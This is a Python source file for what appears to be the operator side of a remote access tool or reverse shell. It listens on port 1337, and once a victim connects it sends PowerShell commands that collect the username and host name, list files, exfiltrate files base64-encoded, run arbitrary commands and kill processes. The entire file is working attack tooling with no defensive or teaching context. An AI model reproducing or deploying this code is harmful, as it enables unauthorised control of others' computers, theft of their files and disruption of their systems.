import socket
import time
import base64

close_socket = "end_by_raphgui"


def server_start():

    host = "192.168.0.58"
    port = 1337

    print(f"[+] Server : {host} {port}")
    server_socket = socket.socket() 
    server_socket.bind((host, port))
    server_socket.listen(2)

    con_user, address = server_socket.accept()
    
    remote_ip = address[0]
    print(f"\nConnection from : {remote_ip}\n")
    return con_user

def default_information(socket_user):
    cmd_username = "[Environment]::UserName"
    cmd_desktop  = "$Env:ComputerName"
    cmd_pwd      = "$pwd.Path.PadLeft(80)"

    socket_user.send(cmd_username.encode())
    print(f"Username     : {socket_user.recv(1024).decode()}")

    socket_user.send(cmd_desktop.encode())
    print(f"Desktop      : {socket_user.recv(1024).decode()}")

    socket_user.send(cmd_pwd.encode())
    print(f"Current Path : {socket_user.recv(1024).decode()}")


def rce_cmd(command: str, socket_user):
    socket_user.send(command.encode())
    print(f"Result : {socket_user.recv(1024).decode()}")

def server_close(socket):
    socket.send(close_socket.encode())
    socket.close()
    print(f"\n[-] Server : Closed")


def download_file(file, socket):
    base64_file = """[Convert]::ToBase64String((Get-Content -Path '{}' -Encoding Byte))""".format(file)
    name = file + "_dl"

    socket.send(base64_file.encode())
    resultat = base64.b64decode(socket.recv(1024).decode()).decode()
    
    f = open(name, "w+")
    f.write(resultat)
    print(f"Resultat : Write")

def list_file(socket):
    cmd_ls = "Get-ChildItem -Force | ForEach-Object { $_.Name }"
    socket.send(cmd_ls.encode())
    resultat = socket.recv(1024).decode()
    print(f"\nFile : \n\n{resultat}")


def kill_process(name: str, socket):
    kill_process = """Get-Process -Name "{}" | ForEach-Object {{ Stop-Process -Id $_.Id }}""".format(name)
    socket.send(kill_process.encode())
    print("\n[+] Process be killed")

def choice_cmd(choix: str, socket):
    if choix == "close":
        server_close(socket=socket_user)
        return -1
    if choix == "ls":
        list_file(socket=socket)
    if choix == "download":
        file = input("File Request : ")
        download_file(file=file, socket=socket)
    if choix == "rce":
        rce_cmd(command=input("\nEnter your command : "), socket_user=socket)
    if choix == "kill":
        kill_process(name=input("\nEnter Process name : "), socket=socket)
    return 0



if __name__ == '__main__':
    socket_user = server_start()
    default_information(socket_user=socket_user)
    while True:
        a = choice_cmd(choix=input("\nWhat u want  : "), socket=socket_user)
        if a == -1:
            break